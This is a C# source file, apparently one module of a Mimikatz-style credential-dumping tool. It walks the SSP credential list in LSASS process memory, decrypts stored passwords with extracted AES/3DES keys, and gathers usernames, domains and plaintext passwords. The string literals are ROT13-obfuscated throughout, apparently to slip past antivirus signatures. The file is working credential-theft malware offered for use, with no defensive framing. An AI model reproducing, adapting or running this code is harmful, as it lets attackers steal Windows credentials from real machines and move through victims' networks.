//start
using System.Text;
using System.Linq;
using System;
﻿//

using ldump_rot13.Credential;
using ldump_rot13.Crypto;
using System.Collections.Generic;
using System.Runtime.InteropServices;

using static ldump_rot13.Win32.Natives;

namespace ldump_rot13.Module
{
    class Ssp
    {

        static long max_search_size = 200000;

        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_SSP_CREDENTIAL_LIST_ENTRY
        {
            public IntPtr Flink;
            public IntPtr Blink;
            public uint References;
            public uint CredentialReferences;
            public LUID LogonId;
            public uint unk0;
            public uint unk1;
            public uint unk2;
            public Msv1.KIWI_GENERIC_PRIMARY_CREDENTIAL credentials;
        };

        public static int FindCredentials(IntPtr hLsass, IntPtr msvMem, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
        {
            KIWI_SSP_CREDENTIAL_LIST_ENTRY entry;
            IntPtr sspCredentialListAddr;
            IntPtr llCurrent;
            string passDecrypted = "";
            
            sspCredentialListAddr = Utility.GetListAdress(hLsass, msvMem, new string("zfi1_0.qyy".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), max_search_size, oshelper.CREDENTIALLISTOFFSET, oshelper.SspCredentialListSign);

            //Console.WriteLine("[*] Ssp  SspCredentialList found at address {0:X}", sspCredentialListAddr.ToInt64());

            llCurrent = sspCredentialListAddr;

            do
            {
                byte[] entryBytes = Utility.ReadFromLsass(ref hLsass, llCurrent, Marshal.SizeOf(typeof(KIWI_SSP_CREDENTIAL_LIST_ENTRY)));
                entry = Utility.ReadStruct<KIWI_SSP_CREDENTIAL_LIST_ENTRY>(entryBytes);

                string username = Utility.ExtractUnicodeStringString(hLsass, entry.credentials.UserName);
                string domain = Utility.ExtractUnicodeStringString(hLsass, entry.credentials.Domaine);
                int reference = (int)entry.References;

                byte[] msvPasswordBytes = Utility.ReadFromLsass(ref hLsass, entry.credentials.Password.Buffer, entry.credentials.Password.MaximumLength);

                byte[] msvDecryptedPasswordBytes = BCrypt.DecryptCredentials(msvPasswordBytes, iv, aeskey, deskey);

                passDecrypted = Encoding.Unicode.GetString(msvDecryptedPasswordBytes);

                /*Console.WriteLine(new string("YHVQ ".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()) + entry.LogonId.LowPart);
                 Console.WriteLine(new string("Ersreraprf ".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()) + entry.References);
                 Console.WriteLine(new string("PerqragvnyErsreraprf ".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()) + entry.CredentialReferences);
                 Console.WriteLine("Uusername {1} {0}", username, entry.credentials.UserName.MaximumLength);
                Console.WriteLine("Udomain {1} {0}", domain, entry.credentials.Domaine.MaximumLength);
                Console.WriteLine("Upassword {1} {0}", passDecrypted, entry.credentials.Password.MaximumLength);*/
                if (!string.IsNullOrEmpty(username) && username.Length > 1)
                {
                    LUID luid = entry.LogonId;

                    Credential.Ssp sspentry = new Credential.Ssp();
                    sspentry.Reference = reference; 
                    sspentry.UserName = username;

                    if (!string.IsNullOrEmpty(domain))
                    {
                        sspentry.DomainName = domain;
                    }
                    else
                    {
                        sspentry.DomainName = new string("[AHYY]".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray());
                    }
                    
                    if (!string.IsNullOrEmpty(passDecrypted))
                    {
                        sspentry.Password = passDecrypted;

                    }
                    else
                    {
                        sspentry.Password = new string("[AHYY]".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray());
                    }

                    Logon currentlogon = logonlist.FirstOrDefault(x => x.LogonId.HighPart == luid.HighPart && x.LogonId.LowPart == luid.LowPart);
                    if (currentlogon == null)
                    {
                        currentlogon = new Logon(luid);
                        currentlogon.UserName = username;
                        currentlogon.Ssp = new List<Credential.Ssp>();
                        currentlogon.Ssp.Add(sspentry);
                        logonlist.Add(currentlogon);
                    }
                    else
                    {
                        if (currentlogon.Ssp == null)
                            currentlogon.Ssp = new List<Credential.Ssp>();

                        currentlogon.Ssp.Add(sspentry);
                    }
                }

                llCurrent = entry.Flink;
            } while (llCurrent != sspCredentialListAddr);

            return 0;
        }
    }
}
